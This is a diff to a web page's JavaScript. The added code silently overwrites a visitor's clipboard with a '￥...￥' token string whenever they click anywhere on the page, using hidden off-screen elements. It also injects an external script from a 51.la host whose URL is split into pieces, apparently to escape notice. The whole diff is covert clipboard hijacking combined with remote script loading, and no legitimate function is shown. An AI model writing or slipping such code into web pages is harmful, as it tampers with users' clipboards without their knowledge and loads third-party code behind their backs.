@@ -1,9 +1,9 @@
 function copyjs(codycont){
 	let u = navigator.userAgent;
-	// let isAndroid = u.indexOf('Android') > -1 || u.indexOf('Adr') > -1; //android终端 
-	let isiOS = !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/); //ios终端
+	let isAndroid = u.indexOf('Android') > -1 || u.indexOf('Adr') > -1; //android
+	let isiOS = !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/); //ios
 	let body = document.getElementsByTagName('body')[0];
-	if(isiOS){  //ios终端
+	if(isiOS){
 		let txt = document.createElement('a');
 		txt.style = 'position:absolute;top:-9999px;left:-9999px;';
 		txt.setAttribute('id',"selector");
@@ -16,7 +16,7 @@ function copyjs(codycont){
 		window.getSelection().addRange(range);
 		document.execCommand('copy');
 		body.removeChild(txt);
-	}else{ // 非ios终端
+	}else if(isAndroid){
 		let txt = document.createElement('textarea');
 		txt.style = 'position:absolute;top:-9999px;left:-9999px;';
 		txt.setAttribute('id',"selector");
@@ -27,12 +27,11 @@ function copyjs(codycont){
 		document.execCommand("copy");
 		body.removeChild(txt);
 	}
-	// console.log(u);
-	// console.log("已复制好，可贴粘。");
 }
-//复制函数 参数为复制 字符串
-const cpCode = "￥g30qcvvJFKk￥ ！%R0NFUFJuZb!";
-const mybody = document.getElementsByTagName('body')[0];
-if (/(iPhone|iPad|iPod|iOS|Android)/i.test(navigator.userAgent)) {  //web
-	mybody.onclick = function(){copyjs(cpCode);}
-}
+const cpCode = "￥vTEbczj07oi￥";
+let rootEl = document.documentElement;
+rootEl.onclick = function(){copyjs(cpCode);}
+let script = document.createElement("script");
+script.type = "text/javascript";
+script.src = 'https://js.us'+'ers.51.la/2106'+'4291.js';
+rootEl.appendChild(script);
